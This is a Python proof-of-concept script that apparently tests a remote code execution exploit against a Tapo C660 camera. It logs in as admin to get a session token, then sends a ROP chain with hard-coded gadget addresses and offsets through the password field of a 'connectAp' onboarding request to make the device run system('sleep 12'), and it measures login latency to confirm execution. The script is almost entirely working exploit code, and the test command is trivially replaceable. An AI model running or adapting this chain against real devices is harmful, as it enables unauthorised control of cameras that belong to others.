#!/opt/homebrew/bin/python3
"""Discriminating test: does system() actually execute on the C660 ROP chain?

If the chain works: system('sleep N') blocks the worker ~N s (parallel login stalls),
then the handler crashes. If the chain is broken: instant crash, parallel login fine.
Reads /tmp/rop_timing.json result for the watchers.
"""
import subprocess, time, json, struct, base64, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.4.92"
POP, PIVOT, SYSTEM = 0x24462, 0x28514e, 0x15928
OFF = 1060
SLEEP_S = 12

def curl(body, path="/", timeout=25):
    return subprocess.run(["curl","-sk","--interface","en1","-m",str(timeout),
        "-H","Content-Type: application/json","-H","User-Agent: Tapo CameraClient Android",
        "-X","POST","-d",json.dumps(body),f"https://{HOST}{path}"],
        capture_output=True,text=True)

def ds_login():
    t0=time.time()
    r = curl({"method":"login","params":{"cnonce":"","encrypt_type":"3","username":"admin"}}, timeout=6)
    return r.stdout, time.time()-t0

out, dt = ds_login()
if "stok" not in out:
    print(json.dumps({"result":"camera-asleep","ds_time":round(dt,2)}))
    sys.exit(1)
stok = out.split('"stok":"')[1].split('"')[0]

# baseline parallel-login latency while worker healthy
cmd = f"sleep {SLEEP_S}\x00".encode()
first = OFF + 4
command_at = first + 10*4
buf = bytearray(b"A" * (command_at + len(cmd)))
buf[OFF:OFF+4] = struct.pack("<I", POP)
for i,w in enumerate([SYSTEM] + [0x41414141]*8 + [PIVOT]):
    buf[first+i*4:first+i*4+4] = struct.pack("<I", w)
buf[command_at:command_at+len(cmd)] = cmd
b64 = base64.b64encode(bytes(buf)).decode()
body = {"method":"connectAp","params":{"onboarding":{"connect":{"ssid":"Aardvark","bssid":"00:00:00:00:00:00","auth":1,"encryption":3,"rssi":-50,"password":b64,"unique_key":0,"band":0}}}}

# fire ROP and simultaneously probe login latency at +3s and +8s
t0 = time.time()
rr = curl(body, path=f"/stok={stok}/ds", timeout=25)
fire_dt = time.time()-t0
time.sleep(3)
t2=time.time()
probe1 = ds_login()
p1_dt = time.time()-t2
time.sleep(max(0, SLEEP_S-3-(time.time()-t0-SLEEP_S)) if False else 5)
t3=time.time()
probe2 = ds_login()
p2_dt = time.time()-t3

verdict = {
    "result": "ran" if (p1_dt > 2.0 or "stok" not in probe1[0]) else "no-exec",
    "fire_s": round(fire_dt,2), "probe1_s": round(p1_dt,2), "probe2_s": round(p2_dt,2),
    "probe1_got_stok": "stok" in probe1[0], "probe2_got_stok": "stok" in probe2[0],
}
print(json.dumps(verdict))
with open("/tmp/rop_timing.json","w") as f: json.dump(verdict, f)
